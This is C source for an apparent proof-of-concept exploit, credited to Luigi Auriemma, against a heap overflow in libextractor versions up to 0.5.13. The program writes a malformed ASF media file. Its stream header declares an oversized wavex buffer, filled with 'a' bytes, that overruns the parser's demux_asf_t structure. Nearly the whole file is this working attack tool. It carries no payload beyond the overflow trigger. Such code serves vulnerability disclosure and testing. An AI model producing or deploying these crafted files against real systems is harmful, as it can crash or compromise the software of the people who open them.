/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>



#define VER         "0.1"
#define BOFCHR      'a'
#define STRUCTSZ    4196    // the bytes from this->wavex to the
                            // end of the demux_asf_t struct
#define BOFSZ       (STRUCTSZ + 8)



void fdinum(FILE *fd, uint64_t num, int size);
void fddata(FILE *fd, const uint8_t *data, int size);
void std_err(void);



const static uint8_t
    asf_head[16]   =
        "\x30\x26\xb2\x75\x8e\x66\xcf\x11\xa6\xd9\x00\xaa\x00\x62\xce\x6c",
    asf_stream[16] =
        "\x91\x07\xdc\xb7\xb7\xa9\xcf\x11\x8e\xe6\x00\xc0\x0c\x20\x53\x65",
    asf_audio[16]  =
        "\x40\x9e\x69\xf8\x4d\x5b\xcf\x11\xa8\xfd\x00\x80\x5f\x5c\x44\x2b",
    asf_none[16]   =
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";



int main(int argc, char *argv[]) {
    FILE    *fd;
    int     bofsize = BOFSZ;
    uint8_t *bof;

    setbuf(stdout, NULL);

    fputs("\n"
        "libextractor <= 0.5.13 (revision 2826) ASF heap overflow "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <file_to_create.ASF> [wavex_size(%d)]\n"
            "\n", argv[0], bofsize);
        exit(1);
    }

    if(argc > 2) bofsize = atoi(argv[2]);

    printf("- create file %s\n", argv[1]);
    fd = fopen(argv[1], "wb");
    if(!fd) std_err();

    fddata(fd,  asf_head,   sizeof(asf_head));      // header
    fdinum(fd,  0,          64);
    fdinum(fd,  0,          32);
    fdinum(fd,  0,          8);
    fdinum(fd,  0,          8);

    fddata(fd,  asf_stream, sizeof(asf_stream));    // stream
    fdinum(fd,  24,         64);                    // >= 24

    fddata(fd,  asf_audio,  sizeof(asf_audio));     // audio

    fddata(fd,  asf_none,   sizeof(asf_none));      // spread or none
    fdinum(fd,  0,          64);
    fdinum(fd,  bofsize,    32);                    // total_size
    fdinum(fd,  0,          32);                    // stream_data_size
    fdinum(fd,  0,          16);                    // stream_id
    fdinum(fd,  0,          32);

    printf("- add a wavex buffer of %d bytes\n", bofsize);
    bof = malloc(bofsize);
    if(!bof) std_err();
    memset(bof, BOFCHR, bofsize);
    fddata(fd,  bof,        bofsize);
    free(bof);

    fclose(fd);
    printf("- finished\n");
    return(0);
}



void fdinum(FILE *fd, uint64_t num, int size) {
    int     i;
    uint8_t tmp[sizeof(uint64_t)];

    size >>= 3;
    for(i = 0; i < size; i++) {
        tmp[i] = (num >> (i << 3)) & 0xff;
    }
    fwrite(tmp, size, 1, fd);
}



void fddata(FILE *fd, const uint8_t *data, int size) {
    fwrite(data, size, 1, fd);
}



void std_err(void) {
    perror("\nError");
    exit(1);
}

